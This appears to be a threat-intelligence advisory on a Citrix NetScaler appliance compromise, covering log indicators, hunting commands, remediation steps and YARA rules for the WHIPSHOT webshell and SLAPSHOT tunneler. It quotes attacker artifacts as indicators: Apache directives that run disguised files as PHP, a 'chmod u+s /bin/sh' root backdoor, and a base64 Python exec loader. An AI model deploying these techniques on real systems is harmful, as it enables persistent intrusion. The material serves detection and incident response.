0-PPE-0 : default SSLLOG SSL_HANDSHAKE_FAILURE 0 : SPCBId - ClientIP - ClientPort - VserverServiceIP - VserverServicePort 443 - ClientVersion DTLSv1.0 - CipherSuite "TLS1-AES-256-CBC-SHA" - Session New - Reason "Handshake failure-Internal Error" qat0: Process <PID> NSPPE-<##> exit with orphan rings 5:500 pitboss[<##>]: pitboss <DATETIME> NOT restarting NSPPE-<##> (<PID>) php_flag engine on <FilesMatch "\.deb$"> Header set Cache-Control "no-cache" </FilesMatch> AddHandler application/x-httpd-php .deb /netscaler/gui/vpn/scripts/linuxphp_flag engine on# AliasMatch ^/vpn/media/(.+).ico$ /var/netscaler/gui/vpn/scripts/linux/$1.sig AddHandler application/x-httpd-php .sig system('/bin/httpd -k restart -f /etc/httpd.conf && chmod u+s /bin/sh');/bin/httpd -k restart -f /etc/httpd.conf#^.*/vpn/scripts/linux.*\n#mnohup <python> -c 'import base64;exec(base64.b64decode("<payload>"))' /tmp/.uxdport /tmp/.uxdlock > /dev/null 2>&1 </dev/null &Dynamic Port Binding & Locking: Verify Web Server Configuration:grep -En -i "application/x-httpd-php|php_flag|AliasMatch" /etc/httpd.conf Audit Appliance Staging and Client Plug-in Directories:/var/netscaler/gui/vpn/scripts/linux//var/netscaler/gui/vpns/scripts/vista//var/netscaler/gui/vpns/scripts/mac//netscaler/ns_gui/vpn/media/file /var/netscaler/gui/vpn/scripts/linux/* /var/netscaler/gui/vpns/scripts/vista/* /var/netscaler/gui/vpns/scripts/mac/* /netscaler/ns_gui/vpn/media/* 2>/dev/null | grep -E "ASCII text|PHP script" grep -rlE "<\?php|eval\(|base64_decode\(|shell_exec\(" /var/netscaler/gui/ /netscaler/ns_gui/ /var/vpn/ /netscaler/portal/ 2>/dev/null Review Web Server Access & Error Logs: grep -E -i "\.(deb|sig|rpm|tgz|sh|so|dat|ico|png|html)" /var/log/httperror*grep -E "/vpn/media/|/vpn/scripts/|/vpn/theme/" /var/log/httpaccess.log* | awk '$9 ~ /200|404/ && $10 > 5000'Check for Ephemeral IPC Artifacts: ls -la /tmp/.uxdport* /tmp/.uxdlock Verify Shell and Binary Permissions:Examine Process Execution & Shell History: ps aux | grep -E "python.*(\.uxd|uxdport|uxdlock|base64)" Review hypervisor network isolation.Part A — Network RestrictionsDisable DTLS where operationally feasible.Restrict inbound UDP/443 upstream.Implement upstream IP allow-listing where feasible.Preserve virtual appliance state for forensic analysis.Part B — Credential Rotation and Session TerminationRotate appliance secrets.Rotate integration credentials.Audit downstream Citrix infrastructure.Part C — Control Plane RestrictionsPart D — Logging and Detection EngineeringProtocol and Traffic AnalysisAlert on exploit-pattern DTLS failures.Correlate DTLS failures with engine termination/crashes.Review unexpected inbound UDP/443.Appliance Process and Memory StabilityMonitor for NSPPE termination/crashes.Alert when pitboss does not restart NSPPE.Correlate with availability events.File System and Configuration IntegrityMonitor critical VPN script paths./var/netscaler/gui/vpn/scripts/linux//netscaler/ns_gui/vpn/scripts/linux//var/netscaler/gui/vpns/scripts/vista//var/netscaler/gui/vpns/scripts/mac//netscaler/ns_gui/vpn/media/Detect unauthorized web server configuration changes.Check runtime state on a recurring basis.Egress and Interaction MonitoringDetect suspicious web shell interaction with static or client-script paths.Identify anomalous appliance egress.rule G_APT_Backdoorwebshell_WHIPSHOT_1 { meta: description = "Detects WHIPSHOT PHP webshell tunneling frontend deployed on Citrix NetScaler ADC appliances" author = "GTIG" family = "WHIPSHOT"
strings: // Chunked transport headers $sh1 = "HTTP_X_UX" ascii $sh2 = "HTTP_X_UX_" ascii
// IPC lock and port pointers to local proxy daemon $si1 = "/.uxdport" ascii $si2 = "/.uxdlock" ascii $si3 = "/tmp/.uxdport /tmp/.uxdlock" ascii
// Socket forwarding logic $sf1 = "fsockopen" ascii $sf2 = "127.0.0.1" ascii condition: filesize < 50KB and ( ($sh1 or $sh2) and ($si1 or $si2 or $si3) and ($sf1 or $sf2) ) } rule G_APT_Tunneler_SLAPSHOT_1 { meta: description = "Detects SLAPSHOT Python proxy daemon and tunneling tool deployed alongside WHIPSHOT on compromised NetScaler appliances" author = "GTIG" family = "SLAPSHOT"
strings: // Lock and port files $ss1 = "/tmp/.uxdport" ascii fullword $ss2 = "/tmp/.uxdlock" ascii fullword $ss3 = "UXD_IDLE_EXIT" ascii fullword $ss4 = "127.0.0.1" ascii
// Wire protocol command verbs $sc1 = "\"open\"" ascii fullword $sc2 = "\"conn\"" ascii fullword $sc3 = "\"push\"" ascii fullword $sc4 = "\"pull\"" ascii fullword $sc5 = "\"exch\"" ascii fullword $sc6 = "\"close\"" ascii fullword $sc7 = "\"ping\"" ascii fullword
// Protocol parameter names $sp1 = "\"sid\"" ascii fullword $sp2 = "\"host\"" ascii fullword $sp3 = "\"port\"" ascii fullword $sp4 = "\"data\"" ascii fullword condition: filesize < 30KB and ( ($ss1 and $ss2 and $ss3) or ($ss4 and ($ss1 or $ss2) and 3 of ($sc*) and 2 of ($sp*)) or ($ss3 and 3 of ($sc*) and 2 of ($sp*)) ) } rule G_Hunting_Config_NetScaler_PHP_1 { meta: description = "Detects unauthorized Apache configuration directives registering non-standard extensions as PHP scripts, or aliasing web paths to appliance script directories on Citrix NetScaler ADC" author = "GTIG"
strings: // NetScaler appliance configuration context markers $ns1 = "/netscaler" ascii nocase $ns2 = "/var/netscaler" ascii nocase $ns3 = "/vpn/" ascii nocase $ns4 = "ns_gui" ascii nocase $ns5 = "<VirtualHost *:81>" ascii nocase $ns6 = "Listen 81" ascii nocase
// Generic type or handler registration mapping non-standard file extensions to PHP $t1 = /Add(Handler|Type)\s+['"]?application\/x-httpd-php['"]?\s+\.([^p\s\r\n][a-zA-Z0-9_-]*|p[^h\s\r\n][a-zA-Z0-9_-]*|ph[^p\s\r\n][a-zA-Z0-9_-]*|php[^s\s\r\n][a-zA-Z0-9_-]*|phps[a-zA-Z0-9_-]+)/ ascii nocase
// Diversion of web asset paths (media, theme, help, logon, images) to script staging directories $a1 = "AliasMatch" ascii nocase $a2 = /\^?\/vpn(s)?\/(media|theme|themes|images|help|logon|support)\// ascii nocase $a3 = /\/var\/netscaler\/gui\/vpn(s)?\/scripts\// ascii nocase $a4 = /\/vpn(s)?\/scripts\// ascii nocase
// PHP execution flags $p1 = "php_flag engine on" ascii nocase
// Exclusions for web pages, markup, and source code $not_html1 = "<html" ascii nocase $not_html2 = "<!DOCTYPE" ascii nocase $not_html3 = "<?xml" ascii nocase $not_code1 = "package " ascii $not_code2 = "#include " ascii condition: filesize < 100KB and not ( $not_html1 or $not_html2 or $not_html3 or $not_code1 or $not_code2 ) and (1 of ($ns*)) and ( // Any directive registering a non-PHP extension as PHP $t1 or // Any AliasMatch diverting web paths to script directories ($a1 and ($a2 or $a3 or $a4)) or // Generic combination of php_flag engine on with script directory aliasing ($p1 and $a1 and ($a3 or $a4)) ) } rule G_Hunting_Backdoorwebshell_NetScaler_C2Headers_1 { meta: description = "Detects standalone PHP webshells deployed on NetScaler appliances extracting commands from custom or native SetEnvIf HTTP headers" author = "GTIG"
strings: // NetScaler C2 header patterns (both HTTP_NSC_* and raw NSC_*, covering all native SetEnvIf variables) $h1 = /(HTTP_)?NSC_[a-zA-Z0-9_]+/ ascii $h2 = /(HTTP_)?NSC_(USER|NONCE|LDAP|CLIENTTYPE|FT_HIDE)/ ascii nocase
// Specific named NetScaler SetEnvIf headers $hs1 = "HTTP_NSC_LDAP" ascii fullword nocase $hs2 = "HTTP_NSC_CLIENTTYPE" ascii fullword nocase $hs3 = "HTTP_NSC_USER" ascii fullword nocase $hs4 = "HTTP_NSC_NONCE" ascii fullword nocase $hs5 = "HTTP_NSC_FT_HIDE" ascii fullword nocase $hs6 = "NSC_USER" ascii fullword nocase $hs7 = "NSC_NONCE" ascii fullword nocase $hs8 = "NSC_LDAP" ascii fullword nocase $hs9 = "NSC_CLIENTTYPE" ascii fullword nocase $hs10 = "NSC_FT_HIDE" ascii fullword nocase
// Dynamic execution sinks $e1 = "eval(base64_decode(" ascii $e2 = "shell_exec(base64_decode(" ascii $e3 = "system(base64_decode(" ascii $e4 = "passthru(base64_decode(" ascii $e5 = "eval(" ascii $e6 = "base64_decode(" ascii $e7 = "shell_exec(" ascii $e8 = "passthru(" ascii $e9 = "system(" ascii $e10 = "exec(" ascii $e11 = "popen(" ascii $e12 = "proc_open(" ascii $e13 = "assert(" ascii
// Concealment and response markers $c1 = "http_response_code(404)" ascii $c2 = "REQUEST_METHOD" ascii $c3 = "<FATO>" ascii $c4 = "</FATO>" ascii condition: filesize < 50KB and ( // Any NSC header accessed alongside dynamic execution ((1 of ($h*) or 1 of ($hs*)) and ($e1 or $e2 or $e3 or $e4 or ($e6 and ($e5 or $e7 or $e8 or $e9 or $e10 or $e11 or $e12 or $e13)))) or // Any NSC header paired with concealment markers ((1 of ($h*) or 1 of ($hs*)) and ($c3 or $c4 or ($c1 and $c2))) or // Standalone FATO marker webshell (($c3 and $c4) and ($e1 or $e2 or ($e5 and $e6) or ($e6 and $e7))) ) } rule G_Hunting_Script_NetScaler_Persistence_1 { meta: description = "Detects appliance staging, installer, and anti-forensic maintenance scripts deployed during NetScaler compromise" author = "GTIG"
strings: // Appliance restart / shutdown commands $cmd1 = "/netscaler/nsshutdown" ascii $cmd2 = "nsshutdown -R" ascii
// SUID root backdoor creation $cmd3 = "chmod u+s /bin/sh" ascii
// Web server reload / restart $cmd4 = "/bin/httpd -k restart" ascii $cmd5 = "httpd -k restart -f /etc/httpd.conf" ascii
// Forensic access log scrubbing regex pattern (across any staging path) $scrub1 = /#\^\.\*\/vpn(s)?\/(scripts|media|theme|themes|help|logon)/ ascii
// Apache configuration modification strings $cfg1 = "AddHandler application/x-httpd-php" ascii $cfg2 = "AddType application/x-httpd-php" ascii $cfg3 = "php_flag engine on" ascii $cfg4 = "AliasMatch" ascii $cfg5 = "SetEnvIf" ascii condition: filesize < 50KB and ( // Log scrubber + privilege escalation or web server restart ($scrub1 and ($cmd3 or $cmd4 or $cmd5)) or // SUID root backdoor creation + appliance command or config modification ($cmd3 and ($cmd1 or $cmd2 or $cmd4 or $cmd5 or $cfg1 or $cfg2 or $cfg3 or $cfg4 or $cfg5)) or // Configuration tampering + appliance command (($cfg1 or $cfg2 or $cfg4) and ($cmd1 or $cmd2 or $cmd4 or $cmd5)) or // Generic 2 of the specific appliance maintenance commands (2 of ($cmd*)) ) }
